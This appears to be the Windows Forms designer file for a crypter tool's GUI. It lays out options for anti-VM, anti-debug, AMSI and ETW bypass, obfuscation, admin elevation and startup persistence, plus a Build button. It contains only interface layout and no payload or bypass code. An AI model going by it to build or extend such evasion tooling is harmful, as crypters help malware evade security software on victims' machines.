namespace Crypter.Forms
{
    partial class FrmCrypter
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.inputfile = new System.Windows.Forms.TextBox();
            this.button1 = new System.Windows.Forms.Button();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.runas = new System.Windows.Forms.CheckBox();
            this.obfuscator = new System.Windows.Forms.CheckBox();
            this.etwBypass = new System.Windows.Forms.CheckBox();
            this.amsiBypass = new System.Windows.Forms.CheckBox();
            this.antiDebug = new System.Windows.Forms.CheckBox();
            this.antiVM = new System.Windows.Forms.CheckBox();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.aes256 = new System.Windows.Forms.RadioButton();
            this.button2 = new System.Windows.Forms.Button();
            this.startup = new System.Windows.Forms.CheckBox();
            this.groupBox1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.SuspendLayout();
            // 
            // inputfile
            // 
            this.inputfile.Location = new System.Drawing.Point(8, 7);
            this.inputfile.Name = "inputfile";
            this.inputfile.Size = new System.Drawing.Size(265, 20);
            this.inputfile.TabIndex = 0;
            // 
            // button1
            // 
            this.button1.Location = new System.Drawing.Point(277, 7);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(65, 20);
            this.button1.TabIndex = 1;
            this.button1.Text = "...";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.startup);
            this.groupBox1.Controls.Add(this.runas);
            this.groupBox1.Controls.Add(this.obfuscator);
            this.groupBox1.Controls.Add(this.etwBypass);
            this.groupBox1.Controls.Add(this.amsiBypass);
            this.groupBox1.Controls.Add(this.antiDebug);
            this.groupBox1.Controls.Add(this.antiVM);
            this.groupBox1.Location = new System.Drawing.Point(8, 33);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(334, 100);
            this.groupBox1.TabIndex = 2;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Options";
            // 
            // runas
            // 
            this.runas.AutoSize = true;
            this.runas.Location = new System.Drawing.Point(120, 64);
            this.runas.Name = "runas";
            this.runas.Size = new System.Drawing.Size(91, 17);
            this.runas.TabIndex = 4;
            this.runas.Text = "Run as admin";
            this.runas.UseVisualStyleBackColor = true;
            // 
            // obfuscator
            // 
            this.obfuscator.AutoSize = true;
            this.obfuscator.Location = new System.Drawing.Point(120, 42);
            this.obfuscator.Name = "obfuscator";
            this.obfuscator.Size = new System.Drawing.Size(83, 17);
            this.obfuscator.TabIndex = 3;
            this.obfuscator.Text = "Obfuscation";
            this.obfuscator.UseVisualStyleBackColor = true;
            // 
            // etwBypass
            // 
            this.etwBypass.AutoSize = true;
            this.etwBypass.Location = new System.Drawing.Point(120, 22);
            this.etwBypass.Name = "etwBypass";
            this.etwBypass.Size = new System.Drawing.Size(121, 17);
            this.etwBypass.TabIndex = 3;
            this.etwBypass.Text = "ETW Bypass/Patch";
            this.etwBypass.UseVisualStyleBackColor = true;
            // 
            // amsiBypass
            // 
            this.amsiBypass.AutoSize = true;
            this.amsiBypass.Location = new System.Drawing.Point(14, 64);
            this.amsiBypass.Name = "amsiBypass";
            this.amsiBypass.Size = new System.Drawing.Size(89, 17);
            this.amsiBypass.TabIndex = 3;
            this.amsiBypass.Text = "AMSI Bypass";
            this.amsiBypass.UseVisualStyleBackColor = true;
            // 
            // antiDebug
            // 
            this.antiDebug.AutoSize = true;
            this.antiDebug.Location = new System.Drawing.Point(14, 42);
            this.antiDebug.Name = "antiDebug";
            this.antiDebug.Size = new System.Drawing.Size(79, 17);
            this.antiDebug.TabIndex = 1;
            this.antiDebug.Text = "Anti-Debug";
            this.antiDebug.UseVisualStyleBackColor = true;
            // 
            // antiVM
            // 
            this.antiVM.AutoSize = true;
            this.antiVM.Location = new System.Drawing.Point(14, 22);
            this.antiVM.Name = "antiVM";
            this.antiVM.Size = new System.Drawing.Size(63, 17);
            this.antiVM.TabIndex = 0;
            this.antiVM.Text = "Anti-VM";
            this.antiVM.UseVisualStyleBackColor = true;
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.aes256);
            this.groupBox2.Location = new System.Drawing.Point(8, 139);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(334, 59);
            this.groupBox2.TabIndex = 4;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Protection";
            // 
            // aes256
            // 
            this.aes256.AutoSize = true;
            this.aes256.Checked = true;
            this.aes256.Location = new System.Drawing.Point(132, 24);
            this.aes256.Name = "aes256";
            this.aes256.Size = new System.Drawing.Size(61, 17);
            this.aes256.TabIndex = 0;
            this.aes256.TabStop = true;
            this.aes256.Text = "Base64";
            this.aes256.UseVisualStyleBackColor = true;
            // 
            // button2
            // 
            this.button2.Location = new System.Drawing.Point(8, 204);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(334, 37);
            this.button2.TabIndex = 5;
            this.button2.Text = "Build";
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // startup
            // 
            this.startup.AutoSize = true;
            this.startup.Location = new System.Drawing.Point(257, 22);
            this.startup.Name = "startup";
            this.startup.Size = new System.Drawing.Size(60, 17);
            this.startup.TabIndex = 5;
            this.startup.Text = "Startup";
            this.startup.UseVisualStyleBackColor = true;
            // 
            // FrmCrypter
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(349, 250);
            this.Controls.Add(this.button2);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.inputfile);
            this.Name = "FrmCrypter";
            this.Text = "Crypter - made by @MpCmdRun";
            this.Load += new System.EventHandler(this.FrmCrypter_Load);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.TextBox inputfile;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.CheckBox antiDebug;
        private System.Windows.Forms.CheckBox antiVM;
        private System.Windows.Forms.CheckBox amsiBypass;
        private System.Windows.Forms.CheckBox etwBypass;
        private System.Windows.Forms.CheckBox obfuscator;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.RadioButton aes256;
        private System.Windows.Forms.Button button2;
        private System.Windows.Forms.CheckBox runas;
        private System.Windows.Forms.CheckBox startup;
    }
}